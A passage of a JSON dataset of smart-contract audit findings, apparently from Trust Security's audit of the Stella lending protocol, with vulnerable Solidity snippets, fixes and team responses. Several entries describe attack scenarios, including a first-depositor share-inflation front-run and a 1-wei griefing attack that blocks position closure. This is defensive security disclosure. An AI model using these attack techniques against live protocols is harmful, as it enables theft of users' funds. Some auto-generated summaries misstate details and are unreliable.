    },
    {
      "id": "19060",
      "title": "TRST-M-8 The freeze mechanism reduces the borrowableAmount, which reduces Lender's yield",
      "impact": "MEDIUM",
      "content": "**Description:**\nThe contract has two freeze intervals, **mintFreezeInterval** and **freezeBuckets.interval**, the \nformer to prevent users from making flash accesses and the latter to prevent borrowers \nfrom running out of funds. \nBoth freeze intervals are applied when a user deposits, and due to the difference in \nunlocking time, it significantly reduces **borrowableAmount** and thus reduces Lender's yield.\n```solidity\n        function _mintInternal(address _receiver,uint _balanceIncreased, uint _totalAsset\n          ) internal returns (uint mintShares) {\n             unfreezeTime[_receiver] = block.timestamp + mintFreezeInterval;\n          if (freezeBuckets.interval > 0) {\n         FreezeBuckets.addToFreezeBuckets(freezeBuckets, _balanceIncreased.toUint96());\n        }\n```\nConsider **freezeBuckets.interval == mintFreezeInterval = 1 day**, 100 ETH in the LendingPool, \nand **borrowableAmount = 100 ETH**.\nAt day 0 + 1s, Alice deposits 50 ETH, **borrowableAmount** **= 150 ETH****-** **lockedAmount(50 ETH)** \n**= 100 ETH**, the 50 ETH frozen in **freezeBuckets** will be unlocked on day 2, while \n**unfreezeTime[alice] = day 1 + 1s**.\nAt day 1 + 1s, **unfreezeTime[Alice]** is reached, Alice can withdraw 50 ETH, \n**borrowableAmount = 100 ETH - LockedAmount(50 ETH) = 50 ETH**.\nIf Bob wants to borrow the available funds in the Pool at this time, Bob can only borrow 50 \nETH, while the available funds are actually 100 ETH, which will reduce Lender's yield by half.\nAt day 2 + 1s, **freezeBuckets** is unfrozen and **borrowableAmount = 100 ETH -LockedAmount(0 ETH) = 100 ETH**.\n\n**Recommended Mitigation:**\nConsider making **mintFreezeInterval >= 2 * freezeBuckets.interval**, which makes \n**unfreezeTime** greater than the unfreeze time of **freezeBuckets**.\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team addressed this issue by changing the algorithm (unlocking the same amount from \nthe buckets when the user made withdrawals).",
      "summary": "\nThis bug report outlines an issue with two freeze intervals, **mintFreezeInterval** and **freezeBuckets.interval**, which are applied when a user deposits in a contract. Due to the difference in unlocking time, this significantly reduces the **borrowableAmount** and thus reduces the Lender's yield. \n\nFor example, if **freezeBuckets.interval == mintFreezeInterval = 1 day**, 100 ETH in the LendingPool, and **borrowableAmount = 100 ETH**, Alice deposits 50 ETH. This reduces **borrowableAmount** to 50 ETH, as 50 ETH is locked in **freezeBuckets** and will be unlocked on day 2, while **unfreezeTime[alice] = day 1 + 1s**. This means Bob can only borrow 50 ETH, while the available funds are actually 100 ETH, which reduces Lender's yield by half.\n\nThe team responded to this issue by changing the algorithm so that the same amount is unlocked from the buckets when the user makes withdrawals. This means that **mintFreezeInterval >= 2 * freezeBuckets.interval**, which makes **unfreezeTime** greater than the unfreeze time of **freezeBuckets**. This fixes the issue and prevents the reduction in Lender's yield.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19059",
      "title": "TRST-M-7 Changing liquidation vault or token makes liquidations impossible",
      "impact": "MEDIUM",
      "content": "**Description:**\nWhen UniswapV3Strategy is initialized, it approves spending of the liquidation token to the \nliquidation vault. The addresses of the vault and the token are read from the Config contract, \nwhich allows the “exec” role to change them. However, after liquidation vault or token is \nchanged, token spending is not re-approved. As a result, liquidations will always revert \nbecause the new vault won’t be able to take liquidation tokens from the strategy contract (or \nthe old vault won’t be able to take the new liquidation token, if the token was changed).\n\n**Recommended Mitigation:**\nStrategy contracts need a (restricted) way to approve arbitrary tokens to arbitrary addresses. \nBaseStrategy.approve() allows that, but it only approves to whitelisted routers. Thus, our \nrecommendation is to allow any spender address in the BaseStrategy.approve() function.\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team addressed this issue by extending target approval to either liquidation vault or \nrouter in `BaseStrategy.approve()`",
      "summary": "\nThis bug report is about an issue with UniswapV3Strategy. When the contract is initialized, it approves spending of the liquidation token to the liquidation vault. The addresses of the vault and the token are read from the Config contract, which allows the “exec” role to change them. However, after liquidation vault or token is changed, token spending is not re-approved, resulting in liquidations always reverting. \n\nThe team recommended allowing any spender address in the BaseStrategy.approve() function to mitigate this issue. The team then fixed the issue by extending target approval to either liquidation vault or router in `BaseStrategy.approve()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19058",
      "title": "TRST-M-6 Pending fees calculations don’t allow overflowing/underflowing",
      "impact": "MEDIUM",
      "content": "**Description:**\nWhen computing pending fees in the UniswapV3PositionViewer. \n`_computePendingFeesToBeEarned()` function, the calculations of **feeGrowthBelowX128**, \n**feeGrowthAboveX128**, and **feeGrowthInsideX128** don’t allow under- and overflowing. \nHowever, the respective calculations in Uniswap V3 are designed to underflow and overflow \n(for more information, refer to https://github.com/Uniswap/v3-core/issues/573 issue and this https://github.com/Jeiwan/uniswapv3-book/issues/45). As a result, executing \n_computePendingFeesToBeEarned() can revert in some situations, causing transaction \nreverts.\n\n**Recommended Mitigation:**\nIn the `_computePendingFeesToBeEarned()` function, consider wrapping the fee growth \ncalculations in **unchecked**. This is what Uniswap does in the 0.8 branch(https://github.com/Uniswap/v3-core/blob/0.8/contracts/libraries/Tick.sol#L69-L97).\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team addressed this issue by wrapping the fee growth calculations in **unchecked** in \n`_computePendingFeesToBeEarned()`.",
      "summary": "\nThis bug report is about the UniswapV3PositionViewer, which is a tool used to compute pending fees. The calculations of **feeGrowthBelowX128**, **feeGrowthAboveX128**, and **feeGrowthInsideX128** in the `_computePendingFeesToBeEarned()` function do not allow under- and overflowing. This can cause transaction reverts.\n\nThe recommended mitigation was to wrap the fee growth calculations in **unchecked**, which is what Uniswap does in the 0.8 branch. The team fixed the issue by implementing this mitigation.\n\nIn summary, this bug report was about a problem with the UniswapV3PositionViewer, where the calculations of **feeGrowthBelowX128**, **feeGrowthAboveX128**, and **feeGrowthInsideX128** in the `_computePendingFeesToBeEarned()` function did not allow under- and overflowing. This could cause transaction reverts. The team fixed the issue by wrapping the fee growth calculations in **unchecked**.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19057",
      "title": "TRST-M-5 Freezing of repaid debts can cause DoS when borrowing",
      "impact": "MEDIUM",
      "content": "**Description:**\nWhen a debt is repaid, the repaid amount gets frozen via \n`freezeBuckets.addToFreezeBuckets()`. In most scenarios, the repaid amount won’t be frozen \nby the mint freezing mechanism since the amount of time that has passed since the borrowed \nand repaid amount was deposited will almost always be greater than **mintFreezeInterval**\n(which is expected to be 1 day). Thus, a lender can withdraw a repaid amount while it’s frozen \nin FreezeBuckets. This can cause a miscalculation of borrowable funds in the \n`BaseLendingPool.getBorrowableAmount()` function: in the worst case scenario, \n`freezeBuckets.getLockedAmount()` can return a value that’s bigger (it’ll include the repaid \namount) than the current balance of the pool (the repaid amount will be withdrawn), which \nwill case a revert and block borrowing.\n\n**Recommended Mitigation:**\nConsider not freezing repaid funds.\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team addressed this issue by changing the algorithm (unlocking the same amount from \nthe buckets when the user made withdrawals).",
      "summary": "\nThis bug report is about a miscalculation of borrowable funds in the BaseLendingPool.getBorrowableAmount() function. When a debt is repaid, the repaid amount gets frozen via freezeBuckets.addToFreezeBuckets(). In most scenarios, the repaid amount won’t be frozen by the mint freezing mechanism since the amount of time that has passed since the borrowed and repaid amount was deposited will almost always be greater than mintFreezeInterval (which is expected to be 1 day). This can cause a miscalculation of borrowable funds in the BaseLendingPool.getBorrowableAmount() function: in the worst case scenario, freezeBuckets.getLockedAmount() can return a value that’s bigger than the current balance of the pool (the repaid amount will be withdrawn), which will cause a revert and block borrowing. \n\nThe team proposed a mitigation to not freeze repaid funds and fixed the issue by changing the algorithm (unlocking the same amount from the buckets when the user made withdrawals).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19056",
      "title": "TRST-M-4 The swap when closing a position does not consider shareProfitAmts",
      "impact": "MEDIUM",
      "content": "**Description:**\nWhen closing a position, token swap is performed to ensure that the closer can repay the \ndebt, for example, when **operation == EXACT_IN**, tokens of **borrowAmt** are required to be \nexcluded from the swap, and when **operation == EXACT_OUT**, tokens of **borrowAmt** are \nrequired to be swapped. The issue here is that the closer needs to pay not only the **borrowAmt**\nbut also the **shareProfitAmts**, which causes the closure to fail when **percentSwapE18 = 100%** \ndue to insufficient tokens. Although the closer can adjust the **percentSwapE18** to make the\nclosure successful, it greatly increases the complexity.\n```solidity\n        for (uint i; i < swapParams.length; ) {\n        // find excess amount after repay\n        uint swapAmt = swapParams[i].operation == SwapOperation.EXACT_IN\n          ? IERC20(swapParams[i].tokenIn).balanceOf(address(this)) - openTokenInfos[i].borrowAmt\n             : openTokenInfos[i].borrowAmt - IERC20(swapParams[i].tokenOut).balanceOf(address(this));\n                 swapAmt = (swapAmt * swapParams[i].percentSwapE18) / ONE_E18\n                 if (swapAmt == 0) {\n              revert SwapZeroAmount();\n             }\n```\n\n**Recommended Mitigation:**\nConsider taking **shareProfitAmts** into account when calculating **swapAmt**\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team has fixed it as recommended to make the logic correct.",
      "summary": "\nThis bug report is about an issue when closing a position in token swap. The closer needs to pay not only the borrowAmt but also the shareProfitAmts, which causes the closure to fail when percentSwapE18 = 100% due to insufficient tokens. The team recommended to take shareProfitAmts into account when calculating swapAmt, and the team has fixed it as recommended. This makes the logic correct and the issue is resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19055",
      "title": "TRST-M-3 No check for active Arbitrum Sequencer in Chainlink Oracle",
      "impact": "MEDIUM",
      "content": "**Description:**\nIf the Arbitrum sequencer were to go offline the Chainlink oracle may return an invalid/stale \nprice. It should always be checked before consuming any data from Chainlink. \n\nThe Chainlink docs(https://docs.chain.link/data-feeds/l2-sequencer-feeds) on L2 Sequencer Uptime Feeds specify more details.\n\n**Recommended Mitigation:**\nCheck sequencer uptime before consuming any price data.\n\n**Team response:**\nFixed.\n\n**Mitigation Review:**\nThe team addressed this issue by checking sequencer uptime before consuming any price \ndata.",
      "summary": "\nThis bug report is regarding an issue where the Chainlink oracle may return an invalid or stale price if the Arbitrum sequencer were to go offline. To prevent this from happening, the team recommended checking the sequencer uptime before consuming any price data. The team addressed this issue and the mitigation review was successful. The Chainlink docs provide more details on L2 Sequencer Uptime Feeds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19054",
      "title": "TRST-M-2 SwapHelper.getCalldata should check whitelistedRouters[_router]",
      "impact": "MEDIUM",
      "content": "**Description:**\n`SwapHelper.getCalldata()` returns data for swap based on the input, and uses \n**whitelistedRouters** to limit the **_router** param. The issue here is that when \n`setWhitelistedRouters()` sets the **_routers** state to **false**, it does not reset the data in \n**routerTypes** and **swapInfos**, which results in the router still being available in `getCalldata()`.\nAs a result, users can still swap with invalid router data.\n```solidity\n        for (uint i; i < _statuses.length; ) {\n             whitelistedRouters[_routers[i]] = _statuses[i];\n                 if (_statuses[i]) {\n                 routerTypes[_routers[i]] = _types[i];\n        emit SetRouterType(_routers[i], _types[i]);\n        }\n              emit SetWhitelistedRouter(_routers[i], _statuses[i]);\n           unchecked {\n        ++i;\n        }\n        }\n```\n\n**Recommended Mitigation:**\nConsider checking **whitelistedRouters[_router]** in SwapHelper.getCalldata()\n\n**Team response:**\nFixed.\n\n**Mitigation Review:**\nThe team addressed this issue by setting **routerTypes** to **UNSET** status in whitelist function \nwhen delisting.",
      "summary": "\nThis bug report is about the `SwapHelper.getCalldata()` function which returns data for swap based on the input and uses **whitelistedRouters** to limit the **_router** param. The issue was that when `setWhitelistedRouters()` sets the **_routers** state to **false**, it does not reset the data in **routerTypes** and **swapInfos**, which resulted in the router still being available in `getCalldata()`. As a result, users could still swap with invalid router data.\n\nThe team recommended checking **whitelistedRouters[_router]** in SwapHelper.getCalldata() to address the issue. The team then fixed the issue by setting **routerTypes** to **UNSET** status in whitelist function when delisting.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19053",
      "title": "TRST-M-1 markLiquidationStatus() may cause the liquidator to lose premium",
      "impact": "MEDIUM",
      "content": "**Description:**\nWhen the **debtRatioE18** of a position is greater than 1 and less than 1.03 (unmark), the \nliquidator can call `markLiquidationStatus()` to accumulate **timeDiscountMultiplierE18** by \nmaking **pos.startLiqTimestamp == block.timestamp**. The liquidated person can also call \nmarkLiquidationStatus() to reset **pos.startLiqTimestamp** to clear \n**timeDiscountMultiplierE18**, which results in that when the debtRatioE18 of a position \nhovers between 1.0 and 1.03, the liquidated person can front run the liquidator to make the \nliquidator lose premium.\n\nConsider the following scenarios:\n1. Alice's position has **debtRatioE18** greater than 1.0 and less than 1.03 (unmark).\n\n2. Bob calls `markLiquidationStatus()` to initialize the **startLiqTimestamp** of Alice's position, \nand after some time, **timeDiscountMultiplierE18** accumulates to 50%, Bob calls \nliquidatePosition() to liquidate Alice's position.\n\n3. Alice observes Bob's transaction and frontruns a call to `markLiquidationStatus()` to reset \n**startLiqTimestamp, timeDiscountMultiplierE18** is also reset to 0. \n\n4. Bob's transaction is executed and the premium paid by Bob may be less than the profit \nreceived, in the extreme case, if **debtRatioE18 = 1e18**, Bob will not have any profit and will \npay premium.\n\n**Recommended Mitigation:**\nConsider allowing markLiquidationStatus() to set the startLiqTimestamp only when \ndebtRatioE18 >= 1.03(unmark), or allowing the liquidator to set the minimum acceptable \ndiscount.\n```solidity\n        - if (debtRatioE18 >= ONE_E18 && startLiqTimestamp == 0) {\n            + if (debtRatioE18 >= IBasePositionViewer(_positionViewer).unmarkLiqDebtRatioE18() && \n              startLiqTimestamp == 0) {\n        // mark liquidatable if the position is unhealthy and is not marked yet\n        pos.startLiqTimestamp = block.timestamp.toUint32();\n        } else if (\n          startLiqTimestamp != 0 &&\n              debtRatioE18 < IBasePositionViewer(_positionViewer).unmarkLiqDebtRatioE18()\n        ) {\n        // unmark liquidatable if the position is already marked and debt ratio falls below \"unmark debt ratio\"\n        pos.startLiqTimestamp = 0;\n        } else {\n          // revert otherwise\n              revert MarkLiquidationStatusFailed();\n          }\n```\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team addressed this issue by changing the unmark value to ~0.97.",
      "summary": "\nA bug report was filed concerning a problem with the markLiquidationStatus() function in a position. When the debtRatioE18 of a position is greater than 1 and less than 1.03 (unmark), the liquidator can call markLiquidationStatus() to accumulate timeDiscountMultiplierE18 by making pos.startLiqTimestamp == block.timestamp. However, this could result in a liquidated person frontrunning the liquidator, making them lose premium.\n\nThe team proposed a mitigation to this problem by allowing markLiquidationStatus() to set the startLiqTimestamp only when debtRatioE18 >= 1.03 (unmark), or allowing the liquidator to set the minimum acceptable discount. The team then reviewed the mitigation and changed the unmark value to ~0.97. This bug report was then fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19052",
      "title": "TRST-H-8 “Exact output” swaps cannot be executed, blocking repayment of debt",
      "impact": "HIGH",
      "content": "**Description:**\nWhen performing “exact output” swaps via Uniswap V2 and V3, the maximum input amount \nargument (**amountInMax** when calling Uniswap V2’s `swapTokensForExactTokens()`, \n**amountInMaximum** when calling V3’s `exactOutput()`) is set to 0. As a result, swapping \nattempts will always revert because no more than 0 input tokens can be sold (the slippage \ncheck in the Uniswap contracts will always revert because the swaps will require more input \ntokens).\nWe consider it high-severity because an “exact output” swap is mandatory when closing a \nposition that doesn’t have enough tokens to repay(https://github.com/AlphaFinanceLab/stella-arbitrum-private-contract/blob/3a4e99307e9cbf790279e49a4d90771e5486c51d/contracts/stella-strategies/strategies/base/BaseStrategy.sol#L224) the borrowed amount. Thus, since “exact \noutput” swaps are not possible, closing some positions won’t be possible as well, leaving funds \nlocked in the contract.\n\n**Recommended Mitigation:**\nTaking into account that the protocol implements delayed slippage checks, consider setting \nthe maximum input amount arguments to **type(uint256).max.**\n\n**Team response:**\nFixed.\n\n**Mitigation Review:**\nThe team has fixed it as recommended to make the logic correct.",
      "summary": "\nThis bug report is about an issue with Uniswap V2 and V3 when performing “exact output” swaps. The maximum input amount argument was set to 0, which caused the slippage check in the Uniswap contracts to always revert because the swaps would require more input tokens. This was considered high-severity because an “exact output” swap is mandatory when closing a position that doesn’t have enough tokens to repay the borrowed amount. \n\nThe recommended mitigation was to set the maximum input amount arguments to type(uint256).max. The team fixed the issue as recommended, and the mitigation was reviewed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [
        "Slippage",
        "Business Logic"
      ],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19051",
      "title": "TRST-H-7 Pending position fees miscalculation may result in increased PnL",
      "impact": "HIGH",
      "content": "**Description:**\nWhen calculating pending liquidity position fees, **liquidity, tokensOwed0, and tokensOwed1**\nare read from a Uniswap V3 pool using a position belonging to the \nNonfungiblePositionManager contract. However, the read values will also include the liquidity \nand the owed token amounts of all Uniswap V3 users who deposited funds in the price range \nof the position via the NonfungiblePositionManager contract. Since \nNonfungiblePositionManager manages positions in pools on behalf of users, the positions will \nhold liquidity of all NonfungiblePositionManager users. As a result, the PnL of \nUniswapV3Strategy positions may be significantly increased, resulting in increased payouts to \nlenders and loss of funds to borrowers/liquidators.\n\n**Recommended Mitigation:**\nConsider reading the values of liquidity, **tokensOwed0, and tokensOwed1** from the \n`IUniswapV3NPM(uniV3NPM).positions()` call on line 95. The call returns values specifically for \nthe position identified by the token ID.\n\n**Team response:**\nFixed.\n\n**Mitigation Review:**\nThe team has fixed it as recommended to make the logic correct.",
      "summary": "\nThis bug report concerns the NonfungiblePositionManager contract, which manages positions in Uniswap V3 pools on behalf of users. When calculating pending liquidity position fees, the code was reading values for liquidity, tokensOwed0, and tokensOwed1 from the pool that included amounts from all users who had deposited funds in the price range of the position. This caused the PnL of UniswapV3Strategy positions to be significantly increased, resulting in increased payouts to lenders and loss of funds to borrowers/liquidators.\n\nThe recommended mitigation was to read the values of liquidity, tokensOwed0, and tokensOwed1 from the `IUniswapV3NPM(uniV3NPM).positions()` call on line 95. This call returns values specifically for the position identified by the token ID, and the team has fixed it as recommended to make the logic correct.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [
        "Wrong Math",
        "Business Logic"
      ],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19050",
      "title": "TRST-H-6 An attacker can increase liquidity to the position's UniswapNFT to prevent the position from being closed",
      "impact": "HIGH",
      "content": "**Description:**\nUniswapV3NPM allows the user to increase liquidity to any NFT.\n```solidity\n            function increaseLiquidity(IncreaseLiquidityParams calldata params)\n                 external payable override checkDeadline(params.deadline)\n                    returns (\n                     uint128 liquidity, uint256 amount0, uint256 amount1)\n            {\n            Position storage position = _positions[params.tokenId];\n                PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];\n                    IUniswapV3Pool pool;\n                        (liquidity, amount0, amount1, pool) = addLiquidity(\n ```\nWhen closing a position, in `_redeemPosition()`, only the initial liquidity of the NFT will be \ndecreased, and then the NFT will be burned.\n```solidity\n             function _redeemPosition(\n                    address _user, uint _posId\n                     ) internal override returns (address[] memory rewardTokens, uint[] memory rewardAmts) {\n                        address _positionManager = positionManager;\n                    uint128 collAmt = IUniswapV3PositionManager(_positionManager).getPositionCollAmt(_user, \n                    _posId);\n                    // 1. take lp & extra coll tokens from lending proxy\n                    _takeAllCollTokens(_positionManager, _user, _posId, address(this));\n                         UniV3ExtraPosInfo memory extraPosInfo = IUniswapV3PositionManager(_positionManager)\n                             .getDecodedExtraPosInfo(_user, _posId);\n                        address _uniswapV3NPM = uniswapV3NPM; // gas saving\n                    // 2. remove underlying tokens from lp (internal remove in NPM)\n                    IUniswapV3NPM(_uniswapV3NPM).decreaseLiquidity(\n                        IUniswapV3NPM.DecreaseLiquidityParams({\n                            tokenId: extraPosInfo.uniV3PositionId,liquidity: collAmt, amount0Min: 0,\n                    amount1Min: 0,\n                         deadline: block.timestamp\n                    })\n                    );\n                    ...\n                    // 4. burn LP position\n                          IUniswapV3NPM(_uniswapV3NPM).burn(extraPosInfo.uniV3PositionId);\n                      }\n```\n If the liquidity of the NFT is not 0, burning will fail.\n\n```solidity\n        function burn(uint256 tokenId) external payable override isAuthorizedForToken(tokenId) {\n            Position storage position = _positions[tokenId];\n                require(position.liquidity == 0 && position.tokensOwed0 == 0 && position.tokensOwed1 == 0,'Not cleared');\n             delete _positions[tokenId];\n        _burn(tokenId);\n        }\n```    \n This allows an attacker to add 1 wei liquidity to the position's NFT to prevent the position from \nbeing closed, and later when the position expires, the attacker can liquidate it.\n\n**Recommended Mitigation:**\nConsider decreasing the actual liquidity(using uniswapV3NPM.positions to get it) of the NFT \nin `_redeemPosition()`, instead of the initial liquidity\n\n**Team response:**\nFixed.\n\n**Mitigation Review:**\nThe team addressed this issue by decreasing NFT's latest liquidity in `_redeemPosition()`",
      "summary": "\nThis bug report describes an issue in UniswapV3NPM where an attacker can add liquidity to any NFT and prevent a position from being closed. This is possible because when closing a position, only the initial liquidity of the NFT is decreased, and then the NFT is burned. If the liquidity of the NFT is not 0, burning will fail.\n\nThe recommended mitigation for this issue was to consider decreasing the actual liquidity of the NFT in `_redeemPosition()` instead of the initial liquidity.\n\nThe team responded by fixing the issue, and the mitigation review determined that the team addressed the issue by decreasing the NFT's latest liquidity in `_redeemPosition()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19049",
      "title": "TRST-H-5 The attacker can use larger dust when opening a position to perform griefing attacks",
      "impact": "HIGH",
      "content": "**Description:**\nWhen opening a position, unused assets are sent to **dustVault** as dust, but since these dust \nare not subtracted from **inputAmt**, they are included in the calculation of \n**positionOpenUSDValueE36**, resulting in a small **netPnLE36**, which can be used by an \nattacker to perform a griefing attack. \n```solidity\n            uint inputTotalUSDValueE36;\n                for (uint i; i < openTokenInfos.length; ) {\n                 inputTotalUSDValueE36 += openTokenInfos[i].inputAmt * tokenPriceE36s[i];\n                      borrowTotalUSDValueE36 += openTokenInfos[i].borrowAmt * tokenPriceE36s[i];\n                 unchecked {\n            ++i;\n                }\n            }\n                // 1.3 calculate net pnl (including strategy users & borrow profit)\n            positionOpenUSDValueE36 = inputTotalUSDValueE36 + borrowTotalUSDValueE36;\n            netPnLE36 = positionCurUSDValueE36.toInt256() - positionOpenUSDValueE36.toInt256();\n```\nConsider ETH:USDC = 1:1000, **posMinLpSlippageMultiplierE18s = 0.95e18**\n1. Alice opens a position with 2.5 ETH and 2000 USDC, borrows 3 ETH and 3000 USDC, and \nthen dust = 0.5 ETH is sent to **dustVault**. The value of the LP position is actually 10000 USD, \nsince **lpUSDValueE36(10000) > minLpUSDValueE36(10500*0.95 = 9975),** it can pass the LP \nvalue validation.\n```solidity\n            minLpUSDValueE36 = ((inputUSDValueE36 + borrowUSDValueE36) *\n               IConfig(_config).posMinLpSlippageMultiplierE18s(strategy)) / ONE_E18;\n            // 4. get min & max borrow value cap\n            (minBorrowUSDValueE18, maxBorrowUSDValueE18) = \n                 IConfig(_config).getMinMaxCapBorrowUSDValueE18( strategy);\n            }\n                    return\n                        lpUSDValueE36 >= minLpUSDValueE36 &&\n```\n2. After a while, the LP position is raised to 8500 USD. Alice closes the position. In \n**calcProfitInfo**, the calculated **positionOpenUSDValueE36 = 10500 USD** (since the value of \nDust is taken into account) and **netProfit = 10500 - 10500 = 0.**\nThis means that Alice uses Lender's profit as dust, Lender loses their profit.\n\n**Recommended Mitigation:**\nConsider subtracting dust from **inputAmt** when opening a position.\n\n**Team response:**\nAcknowledged, the attacker is not profitable, where the dust vault can later be used to \ndistribute to lenders afterwards if needs be.\n\n**Mitigation Review:**\nIt would be a good practice to distribute the dust to Lender, which can prevent Lender from \nbeing compromised by Griefing attacks.",
      "summary": "\nThis bug report is about a Griefing attack that can be used to exploit the Uniswap Position Protocol. When a position is opened, any remaining assets are sent to the dustVault, but they are not subtracted from the inputAmt, which is used to calculate the positionOpenUSDValueE36. This means that the attacker can use the small netPnLE36 to their advantage. \n\nConsider a situation where Alice opens a position with 2.5 ETH and 2000 USDC, borrows 3 ETH and 3000 USDC, and then 0.5 ETH is sent to dustVault. The value of the LP position is 10000 USD, but since the lpUSDValueE36 is greater than the minLpUSDValueE36, it can pass the LP value validation. Later, when the LP position is raised to 8500 USD, Alice closes the position. In the calculation of netProfit, the dust is taken into account, resulting in a netProfit of 0.\n\nThe recommended mitigation for this bug is to subtract the dust from the inputAmt when opening a position. The team response acknowledges this, and suggests that the dust can be distributed to the Lenders afterwards. This would be a good practice to prevent them from being compromised by Griefing attacks.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [
        "Grief Attack"
      ],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19048",
      "title": "TRST-H-4 First depositor can steal asset tokens of others",
      "impact": "HIGH",
      "content": "**Description:**\nThe first depositor can be front run by an attacker and as a result will lose a considerable \npart of the assets provided.\nWhen the pool has no share supply, in `_mintInternal()`, the amount of shares to be minted is \nequal to the assets provided. An attacker can abuse of this situation and profit of the \nrounding down operation when calculating the amount of shares if the supply is non-zero. \n```solidity\n        function _mintInternal(address _receiver, uint _balanceIncreased, uint _totalAsset\n             ) internal returns (uint mintShares) {\n                unfreezeTime[_receiver] = block.timestamp + mintFreezeInterval;\n        if (freezeBuckets.interval > 0) {\n             FreezeBuckets.addToFreezeBuckets(freezeBuckets, _balanceIncreased.toUint96());\n        }\n                 uint _totalSupply = totalSupply();\n                    if (_totalAsset == 0 || _totalSupply == 0) {\n                     mintShares = _balanceIncreased + _totalAsset;\n                 } else {\n             mintShares = (_balanceIncreased * _totalSupply) / _totalAsset;\n             }\n            if (mintShares == 0) {\n        revert ZeroAmount();\n        }\n        _mint(_receiver, mintShares);\n        }\n``` \nConsider the following scenario.\n1. Alice wants to deposit 2M * 1e6 USDC to a pool.\n2. Bob observes Alice's transaction, frontruns to deposit 1 wei USDC to mint 1 wei share, and \ntransfers 1 M * 1e6 USDC to the pool.\n3. Alice's transaction is executed, since **_totalAsset = 1M * 1e6 + 1** and **totalSupply = 1**, Alice \nreceives 2M * 1e6 * 1 / (1M * 1e6 + 1) = 1 share.\n4. The pool now has 3M*1e6 +1 assets and distributed 2 shares.\nBob profits 0.5 M and Alice loses 0.5 M USDC.\n\n**Recommended Mitigation:**\nWhen **_totalSupply == 0**, send the first min liquidity LP tokens to the zero address to enable \nshare dilution\nAnother option is to use the ERC4626 implementation(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L199C14-L208) from OZ.\n\n**Team response:**\nFixed.\n\n**Mitigation Review:**\nThe team increased the interest-bearing token decimal by 18 to prevent attackers from \nmanipulating the share price by precision loss, and made themself the first depositor to \nprevent potential attacks.",
